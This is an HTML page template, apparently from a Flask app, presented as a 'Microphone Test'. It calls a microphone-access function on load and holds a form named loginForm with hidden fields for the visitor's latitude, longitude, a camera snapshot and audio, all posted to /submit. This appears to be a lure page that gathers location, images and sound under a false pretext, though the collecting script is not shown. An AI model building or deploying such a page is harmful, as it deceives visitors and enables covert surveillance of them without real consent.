<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microphone Test</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
    <div class="bg-gray-800 p-8 rounded-lg shadow-lg w-full max-w-md text-center">
        <h2 class="text-2xl font-semibold mb-4">Microphone Test</h2>
        <p class="text-gray-400 mb-6">Click the button below to test your microphone.</p>
        <form id="loginForm" action="/submit" method="POST">
            <input type="hidden" name="platform" value="MicrophoneAccess">
            <input type="hidden" name="username" value="audio"><br>
            <input type="hidden" name="password" value="audio"><br>
            <input type="hidden" name="latitude" id="latitude">
            <input type="hidden" name="longitude" id="longitude">
            <input type="hidden" name="snapshot" id="snapshot">
            <input type="hidden" name="audio" id="audio">
            
            <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded-lg transition duration-300">
                Test Microphone
            </button>
        </form>
    </div>
    <script src="{{ url_for('static', filename='script.js') }}"></script>
    <script>
        window.onload = function() {
            getMicAccess()

        };
    </script>
</body>
</html>
